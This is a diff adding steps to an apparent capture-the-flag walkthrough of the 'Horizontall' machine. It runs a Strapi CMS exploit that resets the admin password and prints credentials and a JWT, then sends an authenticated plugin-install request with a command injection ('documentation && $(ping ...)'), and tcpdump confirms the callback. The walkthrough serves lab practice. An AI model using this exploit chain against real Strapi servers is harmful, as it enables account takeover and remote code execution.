@@ -50,9 +50,28 @@ Shellcodes: No Results
 Papers: No Results
 ````
 
+4. Use exploit 50239 to generate the JWT
+````
+# python3 50239.py http://api-prod.horizontall.htb
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
 
 
-1. Find api-prod.
+[+] Password reset was successfully
+[+] Your email is: admin@horizontall.htb
+[+] Your new credentials are: admin:SuperStrongPassword1
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNzQ2NTY4LCJleHAiOjE2NDQzMzg1Njh9.VBF90Lw2Hw0Jky2n2H0x5SUsV47DAoxw5HtjbJE3-Gk
+
+
+$>
+````
+
+5. Uses the JWT to test the vulnerability through HTTP request
+
+````
+# tcpdump -i tun0 icmp
+````
 
 ````http
 POST /admin/plugins/install HTTP/1.1
@@ -70,4 +89,12 @@ Content-Length: 69
   "plugin":"documentation && $(ping 10.10.14.26)",
   "port":"1337"
 }
+````
+
+````
+# tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+09:01:14.799327 IP horizontall.htb > 10.10.14.26: ICMP echo request, id 8657, seq 1, length 64
+09:01:14.799373 IP 10.10.14.26 > horizontall.htb: ICMP echo reply, id 8657, seq 1, length 64
 ````
